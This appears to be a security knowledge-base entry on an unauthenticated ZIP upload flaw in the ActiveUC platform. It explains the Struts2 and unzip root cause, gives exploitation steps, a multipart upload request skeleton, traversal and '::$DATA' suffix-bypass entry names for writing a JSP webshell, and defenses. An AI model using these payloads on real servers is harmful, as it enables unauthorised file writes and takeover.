---
id: web-java-component-activeuc-versionctr-upload-unzip-zipslip
title: 网动 ActiveUC versionCtr!editVersion 未鉴权 ZIP 上传：解压目录穿越 + jsp/jspx 后缀过滤与 ::$DATA 绕过
type: scenario
domain: web
path: web/java/component
technique: activeuc-versionctr-zip-upload-zipslip
tags:
- java
- activeuc
- struts2
- file-upload
- zip-slip
- arbitrary-write
- unauth
- component
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:11:59+08:00'
  notes: 已对照原文核对；ZipUtils.Unzip 只比较 jsp/jspx 后缀且未校验 ..，::$DATA 绕过与 getshell 原文未验证（confidence medium）；未复跑。
url: /docs/web/java/component/web-java-component-activeuc-versionctr-upload-unzip-zipslip/
draft: false
kb_aliases:
- ActiveUC 前台文件上传
- versionCtr!editVersion
- uploadAndUnzip
- ZipUtils.Unzip
- Zip Slip
- jsp 后缀过滤绕过
- ::$DATA 绕过
- 网动统一通信平台
---

## 一句话结论

ActiveUC 的 `versionCtr!editVersion.action` 位于未继承鉴权拦截器的 `acenter_index` package，可前台调用；它把上传的 zip 交给 `FileUpload.uploadAndUnzip` → `ZipUtils.Unzip` 解压到 `downloads/` 目录，解压时只按后缀跳过 `jsp`/`jspx` 条目，既不校验条目名中的 `..`（Zip Slip 任意写），也可用 Windows `::$DATA` 让 `shell.jsp::$DATA` 绕过后缀判断，进而覆盖 Web 目录文件或写入 JSP。

## 原理

- **未鉴权入口**：`struts.xml` 的 `acenter_index` package `extends="global"`（只有分页/异常拦截器，没有 `globalAndVerify` 的 `VerifyLogInfoInterceptor`），其中定义 `versionCtr!*` 与 `version!*` 指向 `VersionAction`；`editVersion()` 没有二次 session 校验。
- **上传逻辑**：`VersionAction.editVersion()`：
  1. `realpath = getRealPath("/") + File.separator + "downloads" + File.separator`；
  2. 取 `fileUpload.getFileName()[0]`，取最后一个 `.` 后的 `extension`；
  3. 只允许 `zip`/`apk`；zip 调用 `fileUpload.uploadAndUnzip(realpath)`，apk 调用 `upload(realpath)`。
- **解压逻辑**：`FileUpload.uploadAndUnzip(rootPath)` 遍历上传文件，`FileUtils.copyFile` 保存后，按文件名是否含 `OEM`/`oem` 选择解压目录，然后调用 `ZipUtils.Unzip(zipPath, destPath)`。
- **后缀过滤**：`ZipUtils.Unzip` 对每个 `ZipEntry`：
  ```java
  String name = ze.getName();
  String extension = name.substring(name.lastIndexOf(".") + 1);
  if (extension.equals("jsp") || extension.equals("jspx")) continue;
  File zfile = new File(sdestPath + File.separator + ze.getName());
  ```
  只比较最后一个点后的完整后缀，且没有对 `ze.getName()` 做规范化或 `..` 检查。
- **Zip Slip**：条目名 `../../../../shell.txt` 拼到 `destPath` 后由文件系统解析，写入落在 `downloads/` 之外；可覆盖 Web 目录中的 JSP、配置文件、class 文件等。`new File(zfile.getParentFile().getPath())` 会创建穿越后的父目录，进一步方便写入。
- **后缀过滤绕过（Windows）**：NTFS 的 `::$DATA` 表示文件的默认数据流；条目名 `shell.jsp::$DATA` 的 `lastIndexOf(".")` 仍指向 `.jsp` 前，`extension` 变成 `jsp::$DATA`，不等于 `jsp`/`jspx`，从而通过检查；在 Windows 上写入 `shell.jsp::$DATA` 等同于写 `shell.jsp` 的默认数据流。该绕过是原文提出的思路，文章未给出成功 getshell 截图，需按目标文件系统/JSP 容器行为验证。
- **为什么危害成立**：任意文件写 + Web 目录可解析 → 覆盖已有 JSP/配置或写入新 JSP；即使不 getshell，也能覆盖关键文件破坏业务或写入计划任务/启动脚本。

## 触发条件

- 目标为 ActiveUC（Struts2），存在 `versionCtr!editVersion.action` 且所在 package 未继承鉴权拦截器。
- 上传接口允许 `zip`（或 `apk`）扩展名，且服务端会解压。
- 解压逻辑未校验条目路径 `..`，未使用 `getCanonicalPath()` 做边界检查。
- 进程对 `downloads/` 及其穿越目标目录有写权限；目标目录可被 Web 容器解析（JSP）或可覆盖关键文件。
- Windows 部署时 `::$DATA` 绕过才成立；Linux 部署可考虑其它后缀/解析差异或直接覆盖已有 JSP。

## 利用步骤

1. 确认 `versionCtr!editVersion.action` 无需登录可访问，且表单字段为 `fileUpload.file`、`APP`、`IA_OEM_KEY`、`IA_BASE_VERSION`、`IA_CURRENT_VERSION`。
2. 构造恶意 zip：条目名包含 `../../` 穿越到 Web 根/目标目录；如需绕过 jsp 过滤，在 Windows 目标上使用 `shell.jsp::$DATA`（或先写 `.txt`/`.jspx` 变体测试）。
3. 发送 multipart 请求上传 zip；服务端 `uploadAndUnzip` 解压，条目按穿越路径落盘。
4. 访问写入的 JSP（若成功）或检查关键文件是否被覆盖；若 `::$DATA` 不生效，尝试覆盖已有 JSP、`WEB-INF/classes` 配置或静态资源。
5. 授权测试只写入无害标记文件（如 `../../test.txt`）并在验证后清理，不覆盖生产文件。

## PoC

原文上传请求骨架（zip 内容替换为恶意条目）：

```http
POST /acenter/versionCtr!editVersion.action HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwCSm8qxaqfd10tO

------WebKitFormBoundarywwCSm8qxaqfd10tO
Content-Disposition: form-data; name="APP"

3
------WebKitFormBoundarywwCSm8qxaqfd10tO
Content-Disposition: form-data; name="IA_OEM_KEY"

iactive
------WebKitFormBoundarywwCSm8qxaqfd10tO
Content-Disposition: form-data; name="IA_BASE_VERSION"

8.0.3.10
------WebKitFormBoundarywwCSm8qxaqfd10tO
Content-Disposition: form-data; name="IA_CURRENT_VERSION"

8.0.3.10
------WebKitFormBoundarywwCSm8qxaqfd10tO
Content-Disposition: form-data; name="fileUpload.file"; filename="test.zip"
Content-Type: application/x-zip-compressed

PK...
------WebKitFormBoundarywwCSm8qxaqfd10tO--
```

恶意 zip 条目（示意，需要按目标 Web 根深度调整）：

```text
../../../../shell.jsp::$DATA
../../../../WEB-INF/classes/配置文件
```

关键源码：

```java
// VersionAction.editVersion
String realpath = ServletActionContext.getServletContext().getRealPath("/");
realpath = String.valueOf(realpath) + File.separator + "downloads" + File.separator;
String name = this.fileUpload.getFileName()[0];
String extension = name.substring(name.lastIndexOf(".") + 1);
if (extension.equals("zip") || extension.equals("apk")) {
    if (extension.equals("zip")) {
        this.fileUpload.uploadAndUnzip(realpath);
    } ...
}
```

```java
// ZipUtils.Unzip
String name = ze.getName();
String extension = name.substring(name.lastIndexOf(".") + 1);
if (extension.equals("jsp") || extension.equals("jspx")) continue;
File zfile = new File(String.valueOf(sdestPath) + File.separator + ze.getName());
...
FileOutputStream fouts = new FileOutputStream(zfile);
```

## 变体与关联

- 后缀绕过：Windows `::$DATA`、`shell.jsp.`（末尾点被 Windows 规范化）、大小写/双重扩展、`jspx` 变体；Linux 可尝试覆盖已有 JSP 或写入 `.jsp` 之外的解析类型（如 `.jspf` 被 include）。
- 路径穿越：`../`、`..\`、URL 编码、绝对路径；`new File(parent).mkdirs()` 会帮助创建穿越目录。
- 同一上传逻辑可能被其它 Action 复用；关注 `getFileFileName()` 的搜索命中（MeetingAction、UserAction）。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（Zip Slip 通用原理）。
- 关联：[[web-generic-file-upload-zip-entry-nul-windows-truncation]]（Windows 文件名截断/特殊后缀绕过）。

## 检测与防御

- 解压前对每个 `ZipEntry.getName()` 做 `getCanonicalPath()` 规范化，校验结果必须位于解压根目录内；拒绝 `..`、绝对路径、盘符、反斜杠。
- 不要只按后缀字符串判断：对最终文件路径/文件名做白名单，拒绝 `::$DATA`、末尾点、控制字符；在 Linux 上同样统一校验。
- 上传文件先落盘到非 Web 目录，解压后再按需复制；禁止解压到 Web 根或可解析目录。
- 上传接口加鉴权，`versionCtr!*` 等管理 Action 必须继承鉴权拦截器；限制上传大小与类型。
- 监控上传 zip 条目名中的 `../`、`::$DATA`、`.jsp`，以及 `downloads/` 之外的新文件写入。
